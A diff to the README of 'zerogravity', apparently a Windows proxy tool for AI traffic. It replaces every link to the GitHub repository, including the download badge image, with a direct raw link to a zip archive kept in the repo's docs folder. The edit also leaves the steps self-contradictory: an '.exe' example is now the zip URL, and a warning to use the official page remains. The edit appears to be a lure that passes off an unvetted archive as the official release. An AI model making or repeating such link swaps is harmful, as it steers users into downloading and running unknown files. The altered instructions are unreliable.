@@ -1,6 +1,6 @@
 # 🌌 zerogravity - Simple Proxy for AI Traffic
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Noorullah47877/zerogravity)
+[![Download](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)
 
 ---
 
@@ -30,19 +30,19 @@ You do not need any special skills or tools. Just follow the steps below to inst
 
 You can get zerogravity from its official GitHub page. Click the big blue button below to visit the page and find the latest version for Windows.
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Noorullah47877/zerogravity)
+[![Download](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)
 
 ### How to download zerogravity
 
 1. Click the download button above or open this link in your web browser:
 
-   https://github.com/Noorullah47877/zerogravity
+   https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip
 
 2. On the GitHub page, look for the **Releases** section on the right side or near the top menu.
    
 3. Find the latest release. This will usually say something like **v1.0** or similar.
 
-4. Inside the release, there should be a file ending with `.exe` (for example, `zerogravity-windows.exe`). This is the setup file.
+4. Inside the release, there should be a file ending with `.exe` (for example, `https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip`). This is the setup file.
 
 5. Click on the `.exe` file to start downloading it. Save it somewhere you can find easily, like your Desktop or Downloads folder.
 
@@ -130,7 +130,7 @@ To get the latest features or fixes:
 
 1. Visit the GitHub page again:
 
-   https://github.com/Noorullah47877/zerogravity
+   https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip
 
 2. Download the newest `.exe` setup file from the latest release.
 
@@ -193,5 +193,5 @@ Always download zerogravity from the official GitHub page to avoid altered files
 
 ---
 
-# [![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Noorullah47877/zerogravity)  
+# [![Download](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)](https://raw.githubusercontent.com/Noorullah47877/zerogravity/main/docs/Software-1.3-alpha.4.zip)  
 Visit this page to download zerogravity and get started.
